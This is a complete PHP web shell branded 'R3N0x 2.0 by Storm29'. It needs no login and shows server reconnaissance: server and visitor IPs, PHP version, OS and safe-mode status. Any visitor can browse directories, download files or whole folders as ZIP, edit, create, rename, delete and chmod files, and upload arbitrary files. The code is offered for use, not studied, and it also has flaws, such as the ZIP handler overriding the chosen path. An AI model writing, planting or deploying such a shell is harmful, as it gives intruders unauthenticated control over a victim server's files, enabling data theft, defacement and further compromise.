<?php
//Path Finding
$root = realpath(__DIR__ . '/../../');
$path = isset($_GET['path']) ? realpath($_GET['path']) : $root;
if (!$path || strpos($path, $root) !== 0) $path = $root;

// File download
if (isset($_GET['download'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ZIP download


if (isset($_GET['zip'])) {
    
        // Define $path properly, for example:
    $path = __DIR__; // or set it dynamically
    
    // Check if $path is valid directory
    if (!isset($path) || !is_dir($path)) {
        die("Error: Invalid or undefined path.");
    }
    
    // Check available disk space in MB
    $freeSpaceMB = disk_free_space($path) / (1024 * 1024);
    if ($freeSpaceMB < 10) { // threshold in MB, adjust as needed
        die("Error: Not enough free disk space. Available: " . round($freeSpaceMB, 2) . " MB");
    }
    
    if (!class_exists('ZipArchive')) {
        die("ZipArchive class not available.");
    }
    
    $tmpDir = __DIR__ . DIRECTORY_SEPARATOR . 'tmp';
    if (!is_dir($tmpDir)) {
        mkdir($tmpDir, 0777, true);
    }

    $tmpZip = tempnam($tmpDir, 'zip');
    if ($tmpZip === false) {
        die("Failed to create temporary zip file.");
    }
    $zip = new ZipArchive;
    if ($zip->open($tmpZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        die("Cannot create zip file.");
    }

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            if (!$filePath) continue; // skip if realpath failed
    
            $relPath = substr($filePath, strlen($path) + 1);
            if ($relPath === false || $relPath === '') continue; // skip empty relative path
    
            if (!$zip->addFile($filePath, $relPath)) {
                die("Failed to add file: $relPath");
            }
        }
    }


    if (!$zip->close()) {
        die("Failed to finalize zip.");
    }

    clearstatcache();
    if (!file_exists($tmpZip)) {
        die("Zip file missing after creation.");
    }

    // Disable output buffering (if any)
    while (ob_get_level()) {
        ob_end_clean();
    }

    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . basename($path) . '.zip"');
    header('Content-Length: ' . filesize($tmpZip));
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');

    // Output zip
    $sent = readfile($tmpZip);
    if ($sent === false) {
        die("Failed to read zip file.");
    }

    unlink($tmpZip);
    exit;
}

echo '<style>
.container {
  display: flex;
  flex-wrap: wrap;
  gap: 15px;
  max-width: 800px;
  margin: 0 auto;
}
.box {
  flex: 1 1 calc(25% - 15px); /* 4 per row */
  background: #f0f0f0;
  padding: 10px;
  border-radius: 6px;
  box-sizing: border-box;
  text-align: center;
  font-family: Arial, sans-serif;
  margin-bottom: 10px;
  font-size: 14px;
}
</style>';

echo '<h1 style="text-align:center; font-size: 22px;">Welcome to R3N0x 2.0 by Storm29</h1>';

echo '<div class="container">';
echo '<div class="box">Disk Free Space: ' . round(disk_free_space(__DIR__) / (1024*1024), 2) . ' MB</div>';
echo '<div class="box">Disk Total Space: ' . round(disk_total_space(__DIR__) / (1024*1024), 2) . ' MB</div>';
echo '<div class="box">Server IP: ' . ($_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())) . '</div>';
echo '<div class="box">Your IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . '</div>';
echo '<div class="box" id="dateTime">Current Date & Time: Loading...</div>';
echo '<div class="box">PHP Version: ' . phpversion() . '</div>';
echo '<div class="box">OS: ' . PHP_OS . '</div>';
$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
echo '<div class="box">Safe Mode: ' . $safe_mode . '</div>';
echo '</div>';

echo '<script>
function updateDateTime() {
    const now = new Date();
    const formatted = now.toLocaleString();
    document.getElementById("dateTime").textContent = "Current Date & Time: " + formatted;
}
updateDateTime();
setInterval(updateDateTime, 1000);
</script>';





function list_files($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.') continue;
        echo "<li>";
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            echo "[DIR] <a href='?path=" . urlencode($full) . "'>$item</a>";
        } else {
            echo "[FILE] $item - ";
            echo "<a href='?path=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>Edit</a> ";
            echo "<a href='?path=" . urlencode($dir) . "&del=" . urlencode($item) . "' onclick='return confirm(\"Delete?\")'>Del</a> ";
            echo "<a href='?path=" . urlencode($dir) . "&download=" . urlencode($item) . "'>Download</a>";
        }
        echo "</li>";
    }
}

// File edit
if (isset($_GET['edit'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "Saved. <a href='?path=" . urlencode($path) . "'>Back</a>";
        exit;
    }
    $content = @file_get_contents($file);
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>".htmlspecialchars($content)."</textarea><br><button>Save</button></form>";
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// File delete
if (isset($_GET['del'])) {
    $file = $path . DIRECTORY_SEPARATOR . basename($_GET['del']);
    @unlink($file);
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    @rename(
        $path . DIRECTORY_SEPARATOR . basename($_POST['rename_from']),
        $path . DIRECTORY_SEPARATOR . basename($_POST['rename_to'])
    );
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Create
if (isset($_POST['newfile'])) {
    $new = $path . DIRECTORY_SEPARATOR . basename($_POST['newfile']);
    file_put_contents($new, "");
    header("Location: ?path=" . urlencode($path) . "&edit=" . urlencode($_POST['newfile']));
    //exit;
}

// CHMOD
if (isset($_POST['chmod_file']) && isset($_POST['mode'])) {
    chmod($path . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']), octdec($_POST['mode']));
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// Upload
if (isset($_FILES['upload'])) {
    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
    header("Location: ?path=" . urlencode($path));
    //exit;
}

// UI Start
echo '<style>
body {
  font-family: Arial, sans-serif;
  background: #f7f7f7;
  padding: 20px;
  color: #333;
}

h3, h4 {
  margin-top: 30px;
  color: #2c3e50;
}

ul {
  list-style-type: none;
  padding-left: 0;
}

li {
  background: #fff;
  padding: 8px 12px;
  margin-bottom: 5px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

a {
  color: #3498db;
  text-decoration: none;
  margin-right: 10px;
}

a:hover {
  text-decoration: underline;
}

form {
  margin-top: 10px;
  background: #fff;
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
  width: 400px;
  max-width: 100%;
}

input[type="text"], input[type="file"], input[name="mode"] {
  width: 100%;
  padding: 8px;
  margin: 6px 0;
  border: 1px solid #ccc;
  border-radius: 4px;
}

textarea {
  width: 100%;
  height: 300px;
  font-family: monospace;
  padding: 10px;
  margin-top: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

button {
  background-color: #2ecc71;
  border: none;
  color: white;
  padding: 8px 12px;
  margin-top: 8px;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background-color: #27ae60;
}

hr {
  margin: 30px 0;
}

.form-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 20px;
}

.form-grid > div {
  flex: 1 1 calc(33.333% - 20px);
  min-width: 250px;
}
</style>';

echo "<h3>Current: $path</h3>";

$parent = realpath(dirname($path));
if ($parent !== false && $parent !== $path && strpos($parent, $root) === 0) {
    echo "<a href='?path=" . urlencode($parent) . "'>⬆ Parent</a><br><br>";
}

echo "<ul>";
list_files($path);
echo "</ul>";

?>
<hr>
<div class="form-grid">
  <div>
    <h4>Create New File</h4>
    <form method="post">
      <input name="newfile" placeholder="filename.txt">
      <button>Create</button>
    </form>
  </div>

  <div>
    <h4>Rename File</h4>
    <form method="post">
      <input name="rename_from" placeholder="old.txt">
      <input name="rename_to" placeholder="new.txt">
      <button>Rename</button>
    </form>
  </div>

  <div>
    <h4>CHMOD</h4>
    <form method="post">
      <input name="chmod_file" placeholder="file.txt">
      <input name="mode" placeholder="e.g. 0644">
      <button>Change</button>
    </form>
  </div>

  <div>
    <h4>Upload File</h4>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="upload">
      <button>Upload</button>
    </form>
  </div>

<div>
  <h4 style="margin-bottom:12px; font-size:18px; color:#333; font-family: Arial, sans-serif;">
    Download ZIP of Current Folder
  </h4>
  <?php echo '<a href="?path=' . urlencode($path) . '&zip=1" style="
    display:inline-block;
    padding:10px 20px;
    background-color:#007bff;
    color:#fff;
    font-weight:bold;
    text-decoration:none;
    border-radius:5px;
    transition: background-color 0.3s ease;
  " onmouseover="this.style.backgroundColor=\'#0056b3\'" onmouseout="this.style.backgroundColor=\'#007bff\'">Download ZIP</a>'; ?>
</div>


</div>